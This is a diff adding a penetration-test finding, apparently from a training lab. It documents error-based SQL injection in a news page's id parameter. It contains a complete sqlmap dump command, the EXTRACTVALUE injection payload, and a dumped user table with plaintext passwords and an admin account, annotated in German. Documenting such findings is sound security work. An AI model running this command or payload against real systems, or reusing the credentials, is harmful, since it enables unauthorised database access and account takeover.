@@ -1,0 +1,34 @@
+=== FINDING: SQL Injection (error-based) — visiter-newsdesk.php?id ===
+
+$ sqlmap -u "http://10.10.10.10/visiter-newsdesk.php?id=1" -p id --batch -D TechNation -T Users --dump --threads 4
+
+(wichtige Auszüge)
+
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: id=1 AND EXTRACTVALUE(5727,CONCAT(0x5c,0x716b627171,(SELECT (ELT(5727=5727,1))),0x7171707871))
+
+back-end DBMS: MySQL >= 5.1
+Database: TechNation
+Table: Users
+[12 entries]
++----+------------------------------+----------+---------+------------------+-----------+------------+
+| id | Email                        | Date     | Admin   | Password         | Last_Name | First_Name |
++----+------------------------------+----------+---------+------------------+-----------+------------+
+| 1  | matih@cyberstepsvuln.com     | 12031991 | 0       | AF*cBMTp2Q4hGuk7 | Hautameki | Mati       |
+| 2  | eliasv@cyberstepsvuln.com    | 1111996  | 1       | 5225             | Vais      | Elias      |
+| 3  | johns@cyberstepsvuln.com     | 13051992 | 0       | VaFG4tbqF9#HB8gD | Ramus     | John       |
+| 4  | victoriar@cyberstepsvuln.com | 1061989  | 0       | UmZd2JMaCTsr78*8 | Ropargan  | Victoria   |
+| 5  | nicolew@cyberstepsvuln.com   | 6081999  | 0       | 3!Hmr3FumDtuzFP5 | Warshav   | Nicole     |
+| 6  | johnc@cyberstepsvuln.com     | 4101997  | 0       | 2Lb&Cpu=5$VUppM& | Copper    | John       |
+| 7  | hannahv@cyberstepsvuln.com   | 18092000 | 0       | 39ZV?bCmk@LN88$d | Vladislav | Hannah     |
+| 8  | vardeng@cyberstepsvuln.com   | 19011996 | 0       | U!CPJmWr22yAEqu6 | Gish      | Varden     |
+| 9  | ronk@cyberstepsvuln.com      | 12081998 | 0       | ?aL4KjXKEyaRnF   | Karp'Mac  | Ron        |
+| 10 | georged@cyberstepsvuln.com   | 10101991 | 0       | xyaEtCqGQN8_D*7s | Dovlik    | George     |
+| 11 | havab@cyberstepsvuln.com     | 8021987  | 0       | %Z!Z7tJB5Nf+EF?$ | Bans'bak  | Hava       |
+| 12 | mat@cyberstepsvuln.com       | 21071986 | 0       | 6X?%b*wk6hkbh4Ts | Polak     | Nave       |
++----+------------------------------+----------+---------+------------------+-----------+------------+
+
+Erkenntnis: Vollständiges Auslesen der Benutzertabelle inkl. Admin-Flag (id=2, Admin=1, Passwort 5225).
+Hinweis: Passwort für eliasv in dieser Instanz numerisch (5225), nicht identisch mit älteren Berichtsfragmenten (z. B. komplexe Strings) — immer gegen Live-Dump verifizieren.
